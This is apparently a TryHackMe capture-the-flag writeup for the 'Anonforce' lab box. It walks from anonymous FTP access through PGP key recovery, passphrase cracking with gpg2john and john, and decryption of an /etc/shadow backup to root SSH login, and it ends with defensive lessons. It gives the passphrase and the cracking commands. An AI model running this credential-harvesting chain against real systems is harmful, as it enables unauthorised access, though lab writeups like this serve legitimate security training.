# Anonforce (BSides GT) - TryHackMe Writeup

**Target:** `TARGET_IP` (10.128.148.141 at time of solve)
**OS:** Linux
**Difficulty:** Easy

---

## Attack Chain Overview

```
Port Discovery (21 FTP, 22 SSH)
    ↓
Anonymous FTP login → walk the filesystem
    ↓
user.txt in /home/melodias
    ↓
Custom directory /notread/ → private.asc (PGP key) + backup_encrypted.pgp
    ↓
gpg2john → john → PGP passphrase "xbox360"
    ↓
gpg --import private.asc → gpg --decrypt backup_encrypted.pgp
    ↓
Decrypted backup → /etc/shadow hashes (melodias MD5 + root SHA-512)
    ↓
john --wordlist=rockyou → root password
    ↓
SSH as root → root.txt
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Anonymous FTP Enumeration](#anonymous-ftp-enumeration)
3. [User Flag](#user-flag)
4. [PGP Private Key Recovery](#pgp-private-key-recovery)
5. [Cracking the PGP Passphrase](#cracking-the-pgp-passphrase)
6. [Decrypting the Encrypted Backup](#decrypting-the-encrypted-backup)
7. [Cracking Shadow Hashes](#cracking-shadow-hashes)
8. [Root Flag](#root-flag)
9. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Port Discovery
```bash
export TARGET=10.128.148.141
nmap -sS -p- --min-rate 5000 -n $TARGET
```

```bash
nmap -sVC -p21,22 $TARGET -oA service-scan
```

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | vsftpd — **anonymous login allowed** |
| 22 | SSH | OpenSSH |

The `-sC` script output flags `anonymous FTP login allowed` — that is the entire initial-access surface.

---

## Anonymous FTP Enumeration

```bash
ftp $TARGET
Name: anonymous
Password: <blank>
```

### Walking the filesystem

Once inside, the FTP root is `/` — the box serves up the whole filesystem through FTP. Useful commands:

```
ftp> ls -la
ftp> cd /home
ftp> ls
ftp> cd melodias
ftp> get user.txt
```

### Pull crontab and config context

```
ftp> cd /etc
ftp> mget crontab
ftp> mget passwd
```

`/etc/passwd` confirms `melodias` and `root` as the interesting accounts.

### The unusual directory

Listing `/` reveals `/notread` — not a standard path on Linux. Both files inside are grabbed:

```
ftp> cd /notread
ftp> ls
-rw-------    1 1000   1000   private.asc
-rw-------    1 1000   1000   backup_encrypted.pgp
ftp> get private.asc
ftp> get backup_encrypted.pgp
```

`private.asc` is a **PGP private key** (ASCII-armored). `backup_encrypted.pgp` is ciphertext encrypted against that key.

---

## User Flag

```bash
cat user.txt
```

---

## PGP Private Key Recovery

The key header indicates the owner:

```
This is a PGP private key for: anonforce <melodias@anonforce.nsa>
```

We have the key, but the key is passphrase-protected — we need the passphrase to actually use it.

---

## Cracking the PGP Passphrase

### Convert to a john hash
```bash
gpg2john private.asc > pgp_hash.txt
```

### Crack with rockyou
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt
john --show pgp_hash.txt
```

**Recovered passphrase:** `xbox360`

---

## Decrypting the Encrypted Backup

### Import the key into the keyring
```bash
gpg --import private.asc
```

GPG prompts for the passphrase — enter `xbox360`.

### Decrypt the backup
```bash
gpg --decrypt backup_encrypted.pgp > backup_decrypted.txt
```

Inside `backup_decrypted.txt` is the server's `/etc/shadow` at the time of backup — two hashes worth saving:

```
melodias:$1$...$...:::::::        ← MD5 ($1$)
root:$6$...$...:::::::            ← SHA-512 ($6$)
```

Save both lines to `shadows.txt`.

---

## Cracking Shadow Hashes

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadows.txt
john --show shadows.txt
```

Both hashes crack against rockyou. The `root` password is the flag-unlocking one.

---

## Root Flag

```bash
ssh root@$TARGET
# <enter recovered password>
cat /root/root.txt
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Service scan | Anonymous FTP exposed whole filesystem |
| **Initial Access** | Anonymous FTP read | `/notread/` directory with PGP backup artefacts |
| **Credential Crack** | `gpg2john` + `john` | PGP passphrase `xbox360` from rockyou |
| **Credential Hunt** | PGP-decrypted backup | `/etc/shadow` archived inside the encrypted blob |
| **Privilege Escalation** | `john` against SHA-512 | Root password crackable with rockyou |
| **Final Access** | SSH as root | No key needed, password auth allowed |

### Security Lessons

1. **Do not expose filesystems over anonymous FTP.** Confine FTP chroot to a dedicated directory — never serve `/etc`, `/home`, or system paths.
2. **Never back up `/etc/shadow` to a shared location.** Even encrypted, the key material travels with it.
3. **PGP passphrases follow human patterns.** `xbox360`, seasons, favourite words — rotate to passphrase generators (`diceware`, `pwgen`).
4. **SHA-512 with a weak password still cracks quickly.** Hashing alone is not defense-in-depth; password quality is.

### Related Notes
- [ftp](../../tools/recon/ftp.md) — anonymous login + `mget`
- [gpg](../../tools/creds/gpg.md) — key import + decrypt
- [john](../../tools/creds/john.md) — offline cracking (PGP + shadow)
- [PGP key cracking playbook](../../exploits/creds/pgp-key-cracking.md)
- [Anonymous FTP enumeration](../../exploits/network-services/anonymous-ftp-enumeration.md)
